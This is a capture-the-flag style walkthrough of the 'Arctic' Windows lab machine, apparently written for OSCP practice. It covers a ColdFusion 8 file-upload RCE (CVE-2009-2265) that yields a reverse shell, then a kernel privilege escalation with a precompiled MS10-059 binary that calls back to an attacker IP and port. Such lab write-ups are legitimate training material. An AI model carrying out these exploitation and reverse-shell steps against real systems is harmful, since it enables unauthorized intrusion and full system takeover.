+++
date = '2026-07-23T12:33:07+02:00'
draft = false
title = 'Arctic Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`04/02/2026`**

![Artic.png](/images/imgs_artic/Artic.png)

---
# Introduction

**_Arctic_** is an **Easy-level Windows** machine. The exploitation path focuses on outdated software vulnerabilities. Initial access is gained by exploiting an **Open Directory Indexing** misconfiguration on a **JRun** web server, which allows us to discover a vulnerable **Adobe ColdFusion 8** instance. By leveraging a public exploit, we achieve **RCE** and obtain a reverse shell. The Privilege Escalation is an excellent exercise with the **OSCP** in mind: starting from an unpatched **Windows Server 2008 R2** machine, **Windows Exploit Suggester** is used to identify and execute a kernel exploit (**MS10-059 - Chimichurri**), granting **`NT AUTHORITY\SYSTEM`** privileges.

---
# Techniques Used

- **Web Enumeration & Directory Listing**

- **Adobe ColdFusion 8 RCE (CVE-2009-2265)**

- **Kernel Exploitation (MS10-059 | CVE-2010-2554 | Chimichurri)**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- arctic
```

```text
PORT      STATE SERVICE REASON
135/tcp   open  msrpc   syn-ack ttl 127
8500/tcp  open  fmtp    syn-ack ttl 127
49154/tcp open  unknown syn-ack ttl 127
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV -p 135,8500,49154 arctic
```

```text
PORT      STATE SERVICE REASON          VERSION
135/tcp   open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
8500/tcp  open  http    syn-ack ttl 127 JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   syn-ack ttl 127 Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Port **8500** exposes a **JRun** web server.
**Nmap** had already revealed that the root directory had site indexing enabled (**`Index of /`**).

![index.png](/images/imgs_artic/index.png)

Browsing to **http://arctic:8500** and manually exploring the exposed folders, I found an interesting path: **`/CFIDE/adminapi/administrator.cfc`**. 

![adminapi.png](/images/imgs_artic/adminapi.png)

This led me to an **Adobe ColdFusion 8** login page.

![cf.png](/images/imgs_artic/cf.png)

---
# Initial Access | Adobe ColdFusion 8 RCE

Knowing the exact software version, I used **searchsploit** to look for known vulnerabilities:

```bash
searchsploit Adobe ColdFusion 8
```

![search.png](/images/imgs_artic/search.png)

Among the results, I identified a **Remote Command Execution** exploit: **`cfm/webapps/50057.py`**.

**Note**: _This is an **Unrestricted File Upload** vulnerability that leads to an **RCE** (**CVE-2009-2265**). **Adobe ColdFusion 8** bundles a vulnerable version of **FCKeditor**, which allows unauthenticated users to bypass extension checks and upload files. The exploit automates this exact process: it uploads a malicious payload with a **`.jsp`** extension and requests it, forcing the server to execute the code._

I copied the exploit to my working directory:

```bash
searchsploit -m cfm/webapps/50057.py
```

I modified the **`lhost`**, **`rhosts`**, **`lport`**, and **`rport`** parameters to point to my attacker machine and the target. 

![mod.png](/images/imgs_artic/mod.png)

Once my **netcat** listener was set up, I ran the exploit:

```bash
python3 50057.py
```

![initial1.png](/images/imgs_artic/initial1.png)

![initial2.png](/images/imgs_artic/initial2.png)


I obtained a reverse shell on the target machine as the **`tolis`** user. 

**User flag**:

```cmd
type C:\Users\tolis\Desktop\user.txt
```

![userf.png](/images/imgs_artic/userf.png)

---
# Privilege Escalation | MS10-059 (Chimichurri)

With a foothold on the system, I began the post-exploitation phase. I checked my user privileges with **`whoami /priv`** and immediately noticed that **`SeImpersonatePrivilege`** was enabled.

![whoamipriv.png](/images/imgs_artic/whoamipriv.png)

Initially, I tried to abuse it using various implementations of classic "**Potato Attacks**"(**`GodPotato-NET2`**, **`GodPotato-NET35`**, **`GotPotato-NET4`**, etc.), but without success.

However, analyzing the enumeration output, I noticed two fundamental details:

1. The operating system is an old **Microsoft Windows Server 2008 R2 Standard**.

2. There are no **Hotfixes** (security patches) installed.

![sys.png](/images/imgs_artic/sys.png)

I then looked for **PoC**s for legacy vulnerabilities and tried various exploits. After several unsuccessful manual attempts, I temporarily gave up and switched to **Metasploit**: I generated a payload with **msfvenom**, transferred it, and caught a **meterpreter** session to run the **`post/multi/recon/local_exploit/suggester`** module. The module flooded me with vulnerabilities tied to this specific OS version, confirming that the **Kernel Exploit** route was the correct one.

![msf.png](/images/imgs_artic/msf.png)

**Note**: _As I'm preparing for the **OSCP** certification, I wanted to find a way to complete the machine without relying on **Metasploit** at all costs. So, I looked for an alternative and found a standalone **Python** script that I didn't know existed: [Windows-Exploit-Suggester](https://github.com/strozfriedberg/Windows-Exploit-Suggester)**._

Since it requires **`Python 2.7`**, I had to fix some local dependencies to properly run the tool with the **`xlrd`** library:

```bash
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2.7 get-pip.py
python2.7 -m pip install xlrd==1.2.0
```

I saved the output of the **`systeminfo`** command into a file (**`sysinfo.txt`**) and fed it to the script along with the updated patch database:

```bash
python2.7 windows-exploit-suggester.py -d 2026-07-22-mssb.xls -i sysinfo.txt
```

![expsugg.png](/images/imgs_artic/expsugg.png)

The script confirmed **Metasploit**'s output, returning dozens of critical **CVE**s. Instead of wasting time compiling exploits written in **`C/Go`**, I looked for something pre-compiled and immediately usable.

I identified the **MS10-059** vulnerability, known as **Chimichurri**.

**Note**: This **Local Privilege Escalation** vulnerability (**CVE-2010-2554**) resides in a flaw within the Tracing Feature for Services component of the Windows kernel. A low-privileged attacker can force the execution of arbitrary code, because the system fails to properly validate and manage requests in memory.

I downloaded the pre-compiled executable from this **GitHub** repository:

- **https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe?source=post_page-----84fd7ab89349---------------------------------------**

I transferred **`Chimichurri.exe`** to the target, set up a new listener on my machine, and launched the exploit passing my IP and port.

```bash
Chimichurri.exe <attacker_ip> <attacker_port>
```

![privesc.png](/images/imgs_artic/privesc.png)

After a few seconds, I received a connection back as **`NT AUTHORITY\SYSTEM`**, successfully completely the machine without any automated exploitation tools.

![root.png](/images/imgs_artic/root.png)

---
# Final Thoughts

**_Arctic_** is an Easy, yet highly educational machine.

From an Initial Access perspective, the scenario highlights two deadly sins in web server management: leaving **Open Directory Indexing** enabled and exposing administrative interfaces of severely outdated software (in this case, **ColdFusion 8**) to public networks.

For the Privilege Escalation, the temptation to rely on **Metasploit** was strong, especially since I initially didn't know about **Windows-Exploit-Suggester**. However, keeping the **OSCP** in mind, forcing myself to find a manual alternative to tackle a machine like this was a fundamental step in learning not to depend on heavy automation.

**Sources**:

- **Windows-Exploit-Suggester | https://github.com/strozfriedberg/Windows-Exploit-Suggester**

- **pre-compilato MS10-059 Chimichurri.exe | https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe?source=post_page-----84fd7ab89349---------------------------------------**